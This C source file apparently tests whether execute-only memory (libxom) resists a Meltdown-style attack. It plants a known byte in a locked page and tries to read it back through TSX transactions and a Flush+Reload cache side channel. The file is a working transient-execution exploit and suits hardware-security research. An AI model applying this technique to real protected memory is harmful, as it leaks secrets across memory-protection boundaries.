#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#include "libxom.h"
#include "libcache/cacheutils.h"
#include "microarchitecture.h"

char *victim_page;

#define SECRET 0x90

static uint8_t meltdown_xom_internal(uint32_t success_fraction, uint32_t num_samples) {
  struct xombuf* xbuf = xom_alloc(PAGE_SIZE);
  uint32_t success_counter = 0;

  pagesize = sysconf(_SC_PAGESIZE);
  mem = (char*) mmap(NULL, pagesize * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  memset(mem, 1, pagesize * 256);

  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  victim_page = xbuf->address;

  // Write data we want to recover to our victim page
  memset( victim_page, SECRET, pagesize * sizeof(char) );
  victim_page[PAGE_SIZE - 1] = (char) 0xc3;

  xom_lock(xbuf);
  //mprotect(victim_page, PAGE_SIZE, PROT_READ | PROT_EXEC);

  // Flush our shared memory
  flush_shared_memory();

  printf("Output legend:\n");
  printf("  '0x%x'.....Works\n", (uint8_t)SECRET);

  for(int r = 0; r < num_samples; r++) {
    // Call page, see what happens to the cache structure
    ((void(*)(void))victim_page)();
    //maccess(victim_page);
    mfence();
    // Start TSX transaction if available on CPU
    if(try_start()) {
      // Null pointer access prolongs transient window
      // maccess(0);
      // Perform access based on unauthorized data
      maccess(mem + *(uint8_t*)victim_page * pagesize);
      try_abort();
    }
    try_end();
    mfence();
    if(try_start()) {
      // Null pointer access prolongs transient window
      maccess(0);
      // Perform access based on unauthorized data
      maccess(mem + *(uint8_t*)victim_page * pagesize);
      try_abort();
    }
    try_end();

    // Recover data from cache covert channel
    for(int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) % 256;
      if (mix_i != 0 && flush_reload(mem + mix_i * pagesize)) {
        printf("0x%x ", mix_i);
        fflush(stdout);
        if(mix_i == SECRET)
          success_counter++;
      }
    }
  }

  printf("Meltdown-XOM done!\n");
  xom_free(xbuf);
  return success_counter >= num_samples / success_fraction;
}

attack_status meltdown_xom_c(uint32_t success_fraction, uint32_t num_samples) {
  const uint8_t any = meltdown_xom_internal(success_fraction, num_samples);

  if(!~any)
    return (attack_status){{0, 0, 1}};
  return (attack_status){{any, any, 0}};
}

int main(){
    uint32_t num_samples = 0x10000, success_fraction = 0x16;
    const uint8_t any = meltdown_xom_internal(success_fraction, num_samples);

    printf("Result: %u\n", any);
    return 0;
}
